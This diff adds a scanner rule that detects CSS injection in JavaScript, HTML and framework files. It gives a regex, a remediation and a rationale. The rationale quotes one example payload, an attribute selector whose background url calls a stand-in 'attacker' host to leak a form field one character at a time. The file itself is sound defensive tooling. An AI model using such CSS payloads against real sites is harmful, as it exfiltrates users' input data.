@@ -1,0 +1,24 @@
+id: wide/css-injection
+name: css-injection
+category: INJECTION
+severity: MEDIUM
+languages:
+  - js
+  - jsx
+  - mjs
+  - cjs
+  - ts
+  - tsx
+  - mts
+  - cts
+  - html
+  - htm
+  - xhtml
+  - vue
+  - svelte
+cwe: CWE-74
+pattern: \bstyle\w*\.(?:textContent|innerHTML)\s*\+?=\s*[A-Za-z_$`]|\.insertRule\s*\(\s*[A-Za-z_$`]
+message: User-controlled CSS is written into a style element or stylesheet.
+remediation: Set discrete values via element.style.*, or run the CSS through a strict property/value allowlist.
+why: 'Injected CSS can exfiltrate data with attribute selectors and background: url(), or reface the UI — e.g. input[value^="a"]{background:url(//attacker/steal?a)} leaks a field character by character.'
+confidence: high
